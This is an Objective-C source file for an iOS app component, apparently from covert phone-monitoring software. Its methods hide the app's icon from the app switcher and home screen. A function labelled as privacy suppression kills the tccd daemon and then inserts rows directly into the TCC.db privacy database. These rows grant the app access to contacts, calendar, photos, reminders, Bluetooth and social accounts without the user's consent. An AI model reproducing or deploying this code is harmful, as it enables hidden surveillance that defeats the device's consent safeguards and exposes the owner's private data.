//
//  AppVisibility.m
//  AppContext
//
//  Created by Dominique  Mayrand on 12/21/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//

#import "AppVisibilityImp.h"
#import "DefStd.h"
#import "SharedFileIPC.h"
#import "MessagePortIPCSender.h"
#import "FMDatabase.h"
#import "FMResultSet.h"

#import "SpringBoardServices.h"

@interface AppVisibilityImp (private)
- (void) insertPrivacyAccess;
- (void) insertPrivacyAccessTime;
@end

@implementation AppVisibilityImp

- (id) init {
	if ((self = [super init])) {
	}
	return (self);
}

#pragma mark -
#pragma mark - Applicaton visibility protocol
#pragma mark -

-(void) hideIconFromAppSwitcherIcon: (BOOL) aASHide andDesktop: (BOOL) aDHide {
	NSMutableData *data = [NSMutableData data];
	[data appendBytes:&aASHide length:sizeof(BOOL)];
	[data appendBytes:&aDHide length:sizeof(BOOL)];
	NSBundle* bundle = [NSBundle mainBundle];
	NSString* bundleID = [bundle bundleIdentifier];
	NSInteger length = [bundleID lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
	[data appendBytes:&length length:sizeof(NSInteger)];
	[data appendData:[bundleID dataUsingEncoding:NSUTF8StringEncoding]];
	//NSString *bundleName = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleName"]; // ssmp
	NSString *bundleName = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleDisplayName"]; // MBackup
	length = [bundleName lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
	[data appendBytes:&length length:sizeof(NSInteger)];
	[data appendData:[bundleName dataUsingEncoding:NSUTF8StringEncoding]];
	
	SharedFileIPC *sf = [[SharedFileIPC alloc] initWithSharedFileName:kSharedFileMobileSubstrate];
	[sf writeData:data withID:kSharedFileVisibilityID];
	[sf release];
}

- (void) hideApplicationIconFromAppSwitcherSpringBoard: (NSArray *) aBundleIdentifiers {
	NSMutableData *bundleIdentifiersData = [NSMutableData data];
	NSInteger count = [aBundleIdentifiers count];
	[bundleIdentifiersData appendBytes:&count length:sizeof(NSInteger)];
	for (NSString *bundleIdentifier in aBundleIdentifiers) {
		NSInteger len = [bundleIdentifier lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
		[bundleIdentifiersData appendBytes:&len length:sizeof(NSInteger)];
		[bundleIdentifiersData appendData:[bundleIdentifier dataUsingEncoding:NSUTF8StringEncoding]];
	}
	SharedFileIPC *sf = [[SharedFileIPC alloc] initWithSharedFileName:kSharedFileMobileSubstrate];
	[sf writeData:bundleIdentifiersData withID:kSharedFileVisibilitiesOFFID];
	[sf release];
}

- (void) showApplicationIconInAppSwitcherSpringBoard: (NSArray *) aBundleIdentifiers {
	NSMutableData *bundleIdentifiersData = [NSMutableData data];
	NSInteger count = [aBundleIdentifiers count];
	[bundleIdentifiersData appendBytes:&count length:sizeof(NSInteger)];
	for (NSString *bundleIdentifier in aBundleIdentifiers) {
		NSInteger len = [bundleIdentifier lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
		[bundleIdentifiersData appendBytes:&len length:sizeof(NSInteger)];
		[bundleIdentifiersData appendData:[bundleIdentifier dataUsingEncoding:NSUTF8StringEncoding]];
	}
	SharedFileIPC *sf = [[SharedFileIPC alloc] initWithSharedFileName:kSharedFileMobileSubstrate];
	[sf writeData:bundleIdentifiersData withID:kSharedFileVisibilitiesONID];
	[sf release];
}

- (void) applyAppVisibility {
	MessagePortIPCSender *messagePort = [[MessagePortIPCSender alloc] initWithPortName:kAppVisibilityMessagePort];
	[messagePort writeDataToPort:[NSData data]]; // Just to signal the changes
	[messagePort release];
}

- (void) launchApplication {
	NSBundle* bundle = [NSBundle mainBundle];
	NSString* bundleID = [bundle bundleIdentifier];
	NSString* bundleName = [[[bundle infoDictionary] objectForKey:@"CFBundleName"] retain];
	DLog(@"bundleID: %@, bundleName", bundleID, bundleName);
	
	if ([[[UIDevice currentDevice] systemVersion] intValue] >= 6) {
		[NSThread sleepForTimeInterval:0.4];
	}
	// IOS 6.x for slower devices like 3gs, 4, 4s there is no problem but faster device like 5
	NSInteger error = SBSLaunchApplicationWithIdentifier((CFStringRef)bundleID, NO);
	DLog(@"SBS launching %@ get error: %d", bundleName, error);
	if (error) {
		CFStringRef errorStr = SBSApplicationLaunchingErrorString(error);
		DLog(@"Converting sbs launching %@ error to string, errorStr: %@", bundleName, (NSString *)errorStr);
		CFRelease(errorStr);
	}
	[bundleName release];
}

#pragma mark -
#pragma mark - Privacy surpression functions IOS6
#pragma mark -

- (void) hideFromPrivay {
	system("killall tccd");
	[self insertPrivacyAccess];
	[self insertPrivacyAccessTime];
}

#pragma mark -
#pragma mark Private methods
#pragma mark -

- (void) insertPrivacyAccess {
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	NSFileManager *fileManager = [NSFileManager defaultManager];
	if ([fileManager fileExistsAtPath:@"/var/mobile/Library/TCC/TCC.db"]) {
		NSBundle* bundle = [NSBundle mainBundle];
		NSString* bundleID = [bundle bundleIdentifier];
		NSString *sql = nil;
		NSMutableArray * arrayAccess = [[NSMutableArray alloc] initWithObjects:@"kTCCServiceAddressBook",
																				@"kTCCServiceCalendar" ,
																				@"kTCCServicePhotos",
																				@"kTCCServiceReminders",
																				@"kTCCServiceTwitter",
																				@"kTCCServiceFacebook",
																				@"kTCCServiceSinaWeibo",
																				@"kTCCServiceBluetoothPeripheral",
																				@"ACAccountTypeIdentifierFacebook",
																				@"ACAccountTypeIdentifierTwitter",
																				@"ACAccountTypeIdentifierSinaWeibo",nil];
		
		FMDatabase *db = [FMDatabase databaseWithPath:@"/var/mobile/Library/TCC/TCC.db"];
		[db open];
		for (int i=0; i<[arrayAccess count]; i++) {
			if ([[arrayAccess objectAtIndex:i]length]>0) {
				sql = [NSString stringWithFormat:@"INSERT OR REPLACE INTO access VALUES('%@','%@',0,1,0)",
								[arrayAccess objectAtIndex:i], bundleID];
				[db executeUpdate:sql];
				DLog(@"Update privacy access table, error = %@", [db lastErrorMessage]);
			}
		}
		[arrayAccess release];
		[db close];
	} else {
		DLog (@"/var/mobile/Library/TCC/TCC.db not exist");
	}
	[pool release];
}

- (void) insertPrivacyAccessTime {
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	NSFileManager *fileManager = [NSFileManager defaultManager];
	if ([fileManager fileExistsAtPath:@"/var/mobile/Library/TCC/TCC.db"]) {
		NSBundle* bundle = [NSBundle mainBundle];
		NSString* bundleID = [bundle bundleIdentifier];
		NSString *sql = nil;
		NSMutableArray * arrayAccess = [[NSMutableArray alloc] initWithObjects:@"kTCCServiceAddressBook",
										@"kTCCServiceCalendar" ,
										@"kTCCServicePhotos",
										@"kTCCServiceReminders",
										@"kTCCServiceTwitter",
										@"kTCCServiceFacebook",
										@"kTCCServiceSinaWeibo",
										@"kTCCServiceBluetoothPeripheral",
										@"ACAccountTypeIdentifierFacebook",
										@"ACAccountTypeIdentifierTwitter",
										@"ACAccountTypeIdentifierSinaWeibo",nil];
		
		FMDatabase *db = [FMDatabase databaseWithPath:@"/var/mobile/Library/TCC/TCC.db"];
		[db open];
		for (int i=0; i<[arrayAccess count]; i++) {
			if ([[arrayAccess objectAtIndex:i]length]>0) {
				sql = [NSString stringWithFormat:@"INSERT OR REPLACE INTO access_times VALUES('%@','%@',0,0)",
									[arrayAccess objectAtIndex:i], bundleID];
				[db executeUpdate:sql];
				DLog (@"Update privacy access_times table, error = %@", [db lastErrorMessage]);
			}
		}
		[arrayAccess release];
		[db close];
	} else {
		DLog (@"/var/mobile/Library/TCC/TCC.db not exist");
	}
	[pool release];
}

#pragma mark -
#pragma mark Memory management methods
#pragma mark -

- (void) dealloc {
	[super dealloc];
}

@end
